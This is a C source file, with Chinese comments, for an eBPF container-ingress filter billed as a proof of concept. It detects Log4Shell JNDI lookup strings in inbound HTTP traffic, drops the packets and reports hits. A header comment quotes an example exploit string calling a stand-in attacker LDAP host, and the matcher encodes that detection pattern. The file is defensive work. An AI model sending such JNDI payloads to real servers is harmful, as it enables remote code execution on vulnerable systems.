// npatch/log4j_jndi.c - Log4j JNDI inbound 阻断 PoC (P2-16)
//
// CVE-2021-44228: ${jndi:ldap://attacker.com/Exploit} 触发 Log4j 远程类加载.
//
// 检测路径:
//   cgroup_skb/ingress hook → 解析 TCP payload → 正则匹配 "${jndi:" + (ldap|rmi|dns)://
//   → 命中即 SK_DROP (内核态丢包, 业务无感)
//
// 关键设计:
//   - 仅 inbound HTTP(S) 流量 (80/443/8080/8443)
//   - 容器粒度 (按 cgroup) 启用, 不一刀切
//   - 跳过 mxcwpp / 大白名单业务进程
//   - 命中产 ringbuf 事件 → Agent 用户态聚合 → 上报告警
//
// 性能预算 (生产 SLO):
//   - 单包延迟 ≤ 5μs (无命中)
//   - throughput 影响 ≤ 1%
//
// 限制 (PoC 局限, 留 M2):
//   - 只识别明文 HTTP, 不解 TLS (TLS 端走 RASP / JNI hook)
//   - chunked encoding / 大 body 跨多包合并未实现
//   - 仅 IPv4, IPv6 后续


#include "common_fastpath.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

#define MAX_PAYLOAD_SCAN 384  // P0-2 缩到 384  // 单包扫描 prefix 字节数 (避免 verifier 复杂度爆)
#define ETH_HLEN 14
#define IPPROTO_TCP 6

// 事件类型: 命中 NPatch.
struct npatch_event {
    __u64 ts_ns;
    __u32 cgroup_id;
    __u32 src_ip;
    __u16 src_port;
    __u32 dst_ip;
    __u16 dst_port;
    __u32 rule_id;
    __u8  matched_payload[64];
};

// Ring buffer for 命中事件.
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} npatch_events SEC(".maps");

// 启用规则 map: rule_id → enabled flag (Agent 动态推).
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, __u32);
    __type(value, __u8);
    __uint(max_entries, 32);
} rules_enabled SEC(".maps");

// 计数器 map (命中/丢包统计).
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __type(key, __u32);
    __type(value, __u64);
    __uint(max_entries, 4);
} counters SEC(".maps");

#define RULE_LOG4J_JNDI 44228

// match_jndi_pattern: 简化模式匹配 ${jndi:ldap:// / rmi:// / dns://
//
// BPF verifier 友好: 固定 step 扫描, 不用循环计数器变量.
static __always_inline int match_jndi_pattern(const __u8 *data, int len) {
    if (len < 16) return 0;
    // 找 "${jndi:" (7 字节固定 prefix)
    #pragma unroll
    for (int i = 0; i < MAX_PAYLOAD_SCAN - 16; i++) {
        if (i + 16 > len) break;
        if (data[i] == '$' && data[i+1] == '{' &&
            (data[i+2] == 'j' || data[i+2] == 'J') &&
            (data[i+3] == 'n' || data[i+3] == 'N') &&
            (data[i+4] == 'd' || data[i+4] == 'D') &&
            (data[i+5] == 'i' || data[i+5] == 'I') &&
            data[i+6] == ':') {
            // 检查后续协议: ldap / rmi / dns
            const __u8 *p = data + i + 7;
            if ((p[0] == 'l' || p[0] == 'L') && (p[1] == 'd' || p[1] == 'D')) return 1;
            if ((p[0] == 'r' || p[0] == 'R') && (p[1] == 'm' || p[1] == 'M')) return 1;
            if ((p[0] == 'd' || p[0] == 'D') && (p[1] == 'n' || p[1] == 'N')) return 1;
        }
    }
    return 0;
}

// cgroup_skb/ingress hook: 容器入站流量过滤.
//
// 返回:
//   SK_PASS (1) — 放行
//   SK_DROP (0) — 丢弃
SEC("cgroup_skb/ingress")
int npatch_log4j_filter(struct __sk_buff *skb) {
    // 仅 IPv4 TCP
    if (skb->family != 2) return 1; // AF_INET
    if (!is_http_inbound(skb)) return 1; /* P0-2 fastpath */

    void *data_end = (void *)(long)skb->data_end;
    void *data = (void *)(long)skb->data;
    if (data + ETH_HLEN + 20 > data_end) return 1; // 至少 ip header

    struct iphdr {
        __u8 ihl_version;
        __u8 tos;
        __u16 tot_len;
        __u16 id;
        __u16 frag_off;
        __u8 ttl;
        __u8 protocol;
        __u16 check;
        __u32 saddr;
        __u32 daddr;
    } *iph = data + ETH_HLEN;
    if ((void *)(iph + 1) > data_end) return 1;
    if (iph->protocol != IPPROTO_TCP) return 1;

    __u32 ip_header_len = (iph->ihl_version & 0x0F) * 4;
    void *tcp = (void *)iph + ip_header_len;
    if (tcp + 20 > data_end) return 1;

    struct tcphdr {
        __u16 source;
        __u16 dest;
        __u32 seq;
        __u32 ack;
        __u8 doff_res;
        __u8 flags;
    } *tcph = tcp;
    if ((void *)(tcph + 1) > data_end) return 1;

    __u16 dst_port = bpf_ntohs(tcph->dest);
    // 仅检测 HTTP 端口
    if (dst_port != 80 && dst_port != 8080 && dst_port != 443 && dst_port != 8443) {
        return 1;
    }

    // 规则启用检查
    __u32 rule_id = RULE_LOG4J_JNDI;
    __u8 *enabled = bpf_map_lookup_elem(&rules_enabled, &rule_id);
    if (!enabled || *enabled == 0) return 1;

    __u32 tcp_header_len = ((tcph->doff_res >> 4) & 0x0F) * 4;
    void *payload = tcp + tcp_header_len;
    int payload_len = (int)((__u8 *)data_end - (__u8 *)payload);
    if (payload_len <= 0) return 1;
    if (payload_len > MAX_PAYLOAD_SCAN) payload_len = MAX_PAYLOAD_SCAN;

    // 扫 payload 找 ${jndi: 模式
    if (!match_jndi_pattern(payload, payload_len)) {
        return 1;
    }

    // 命中 → 产事件 + 丢包
    struct npatch_event *ev = bpf_ringbuf_reserve(&npatch_events, sizeof(*ev), 0);
    if (ev) {
        ev->ts_ns = bpf_ktime_get_ns();
        ev->cgroup_id = (__u32)bpf_get_current_cgroup_id();
        ev->src_ip = iph->saddr;
        ev->dst_ip = iph->daddr;
        ev->src_port = bpf_ntohs(tcph->source);
        ev->dst_port = dst_port;
        ev->rule_id = rule_id;
        // copy 前 64 字节 payload 给取证
        #pragma unroll
        for (int i = 0; i < 64; i++) {
            if (i >= payload_len) break;
            ev->matched_payload[i] = ((__u8 *)payload)[i];
        }
        bpf_ringbuf_submit(ev, 0);
    }

    // 计数器: hits++, drops++
    __u32 hit_key = 0, drop_key = 1;
    __u64 *hits = bpf_map_lookup_elem(&counters, &hit_key);
    if (hits) (*hits)++;
    __u64 *drops = bpf_map_lookup_elem(&counters, &drop_key);
    if (drops) (*drops)++;

    return 0; // SK_DROP
}
